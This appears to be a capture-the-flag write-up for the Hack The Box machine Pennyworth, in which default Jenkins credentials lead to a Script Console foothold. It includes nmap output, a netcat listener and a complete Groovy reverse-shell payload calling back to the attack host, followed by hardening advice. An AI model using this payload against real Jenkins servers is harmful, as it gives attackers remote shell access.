Yooo guys, it's ju4dy the landlord again.

# Pennyworth — Hack The Box Starting Point

|  |  |
| --- | --- |
| **Platform** | Hack The Box — Starting Point |
| **Tier** | 1 |
| **Difficulty** | Very easy |
| **Operating system** | Linux |
| **Target IP** | `10.129.57.199` |
| **Skills** | Service enumeration, Jenkins, Script Console abuse, Groovy reverse shell |

## Overview

Pennyworth is a Linux host exposing a single service: Jenkins on port `8080`, served by Jetty. The
`robots.txt` entry is a small hint that the whole application is meant to be private, but the login panel
itself is reachable and the instance is still on its default administrative credentials.

Once logged in, Jenkins offers the Script Console — a Groovy REPL that runs with the server's privileges.
There is no vulnerability to exploit at that point; the feature is simply an execution primitive, and it is
used here to open a reverse shell.

## Enumeration

```bash
nmap -sVC 10.129.57.199
```

```text
Starting Nmap 7.98 ( https://nmap.org ) at 2026-10-15 06:18 +0100
Nmap scan report for 10.129.57.199
Host is up (0.64s latency).
Not shown: 999 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
8080/tcp open  http    Jetty 9.4.39.v20210325
|_http-server-header: Jetty(9.4.39.v20210325)
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
| http-robots.txt: 1 disallowed entry
|_/
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.28 seconds
```

A single open port keeps the enumeration focused. `Jetty` is the servlet container Jenkins ships with, and the
`http-robots.txt` line is worth reading twice: the only disallowed entry is `/`, which tells us the operators
did not want the application indexed and, by itself, confirms what the service is. Browsing to the port shows
the Jenkins login page.

<!-- screenshot: Jenkins login page on port 8080 -->

## Foothold

### Default credentials

The Jenkins instance had not been hardened after installation and still accepted its default administrative
credentials. That is the whole of the initial access: a login form with a well-known password.

<!-- screenshot: Jenkins dashboard after login -->

### Script Console

The Jenkins Script Console (`Manage Jenkins` → `Script Console`, usually at `/script`) executes Groovy on the
controller with the privileges of the Jenkins service account. It is intended for diagnostics, and it is
exactly as powerful as it sounds.

Before running anything, a listener was started on the attack host:

```bash
nc -nvlp 4444
```

The payload below starts `/bin/bash`, connects back to the listener and forwards all three standard streams
through the socket. `host` and `port` must match the listener — in this session the attack host was
`10.10.17.166` and the port `4444`:

```text
String host = "10.10.17.166";
int port = 4444;
String cmd = "/bin/bash";
Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();
Socket s = new Socket(host, port);
InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();
OutputStream po = p.getOutputStream(), so = s.getOutputStream();
while (!s.isClosed()) {
    while (pi.available() > 0) so.write(pi.read());
    while (pe.available() > 0) so.write(pe.read());
    while (si.available() > 0) po.write(si.read());
    so.flush();
    po.flush();
    Thread.sleep(50);
    try { p.exitValue(); break; } catch (Exception e) {}
}
p.destroy();
s.close();
```

Submitting the script makes Jenkins run the shell and the listener receives the connection.

<!-- screenshot: reverse shell caught on the nc listener -->

## Finishing the box

The connection arrived on the listener as the Jenkins service account, the shell was upgraded to a TTY, and
the flag was read from the filesystem. Nothing beyond the default credential was needed: Script Console is
remote code execution by design, and it did exactly what it advertises.

<!-- screenshot: reverse shell as the Jenkins account -->

## Key takeaways

- **Jenkins Script Console is remote code execution by design.** Any account that can reach it is equivalent
  to a shell on the controller, so access must be restricted to trusted administrators.
- **Default credentials on an internet-facing CI server are a full compromise.** Changing the initial admin
  password and enabling matrix-based authorization is the minimum hardening step after installation.
- **Bind the controller to a management network.** Port `8080` should never be exposed to untrusted networks,
  and Jenkins should be behind a reverse proxy with authentication and TLS.
- **Treat `robots.txt` as a signal, not a control.** `Disallow: /` advertises that something worth hiding is
  there, and it protects nothing.
- **Disable unused administrative features.** Removing or access-restricting the Script Console closes the
  easiest post-authentication path on any Jenkins instance.
